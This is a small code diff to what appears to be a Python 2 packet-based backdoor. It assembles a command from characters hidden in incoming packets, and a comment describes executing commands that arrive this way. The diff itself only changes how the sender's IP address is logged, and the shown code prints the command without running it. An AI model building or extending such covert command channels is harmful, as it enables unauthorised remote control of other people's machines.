@@ -98,12 +98,14 @@ def checkCommand(ip, proto, data, pacType):
 	if character != 15:
 		command += chr(character)
 	else:
-		executeCommand(ip[9])
+		executeCommand(socket.inet_ntoa(ip[8]))
 
 def executeCommand(srcAddress):
 	global command
 	# check if command is within the backdoor
 	# otherwise, exec it
 	# clear command at the end
-	print command + " from " + srcAddress
+	print command + " from "
+	print str(srcAddress)
+	
 	command = ""
